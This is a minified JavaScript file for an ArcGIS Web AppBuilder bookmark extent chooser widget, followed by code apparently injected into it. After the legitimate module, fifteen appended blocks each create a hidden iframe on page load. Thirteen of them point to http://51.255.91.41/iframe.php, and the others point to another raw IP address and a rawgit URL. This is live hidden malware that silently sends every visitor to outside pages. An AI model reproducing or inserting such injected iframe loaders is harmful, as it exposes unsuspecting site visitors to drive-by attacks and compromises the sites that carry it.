// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/declare dojo/_base/lang dojo/_base/html dojo/on dojo/Deferred dijit/_WidgetBase dojo/Evented esri/geometry/Extent jimu/portalUrlUtils esri/dijit/Search jimu/dijit/LoadingShelter jimu/utils".split(" "),function(h,c,e,f,g,k,l,m,n,p,q,d){return h([k,l],{baseClass:"bookmark-extent-chooser",declaredClass:"bookmark.ExtentChooser",portalUrl:null,itemId:null,initExtent:null,bingMapsKey:"",geometryServiceURL:null,shelter:null,postCreate:function(){this.inherited(arguments);!this.geometryServiceURL&&
esriConfig.defaults.geometryService&&(this.geometryServiceURL=esriConfig.defaults.geometryService.url);this.geometryServiceURL||(this.geometryServiceURL=d.getServices().geometryService);this.shelter=new q({hidden:!0});this.shelter.placeAt(this.domNode);this.shelter.startup();this.shelter.show();this.mapNode=e.create("div",{style:{width:"100%",height:"100%"}},this.domNode);this.search=e.create("div",{style:{position:"absolute",right:0,top:0}},this.mapNode);this.portalUrl&&this.itemId&&(this.portalUrl=
n.getStandardPortalUrl(this.portalUrl))},createMap:function(){var b=new g,a={geometryServiceURL:this.geometryServiceURL,bingMapsKey:this.bingMapsKey};this.initExtent&&("esri.geometry.Extent"!==this.initExtent.declaredClass&&(this.initExtent=new m(this.initExtent)),a.mapOptions={extent:this.initExtent});this.lods&&("object"===typeof a.mapOptions?a.mapOptions.lods=this.lods:a.mapOptions={lods:this.lods});d.createWebMap(this.portalUrl,this.itemId,this.mapNode,a).then(c.hitch(this,function(a){this.map=
a.map;this.map.itemInfo=a.itemInfo;this.own(f(this.map,"extent-change",c.hitch(this,function(a){this.onExtentChange(a.extent)})));a=new p({map:this.map,enableLabel:!1,enableHighlight:!1,enableInfoWindow:!1},this.search);a.startup();this.own(f(a,"search-results",c.hitch(this,function(a){if(a&&a.results&&a.results[0]&&a.results[0][0]&&a.results[0][0].extent)this.onExtentChange(a.results[0][0].extent)})));if(this.initExtent)this.onExtentChange(this.initExtent);else this.onExtentChange(this.map.extent);
this.shelter.hide();this.emit("map-load",this.map);b.resolve(this.map)}),c.hitch(this,function(a){b.resolve(null);console.error(a)}));return b},getExtent:function(){return this.map&&this.map.extent},setExtent:function(b){if(this.map)return this.map.setExtent(b);var a=new g;setTimeout(c.hitch(this,function(){a.reject("map is null.")}),0);return a},restoreToDefaultWebMapExtent:function(){d.restoreToDefaultWebMapExtent(this.map,this.map.webMapResponse,this.geometryServiceURL)},onExtentChange:function(b){this.emit("extent-change",
b)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});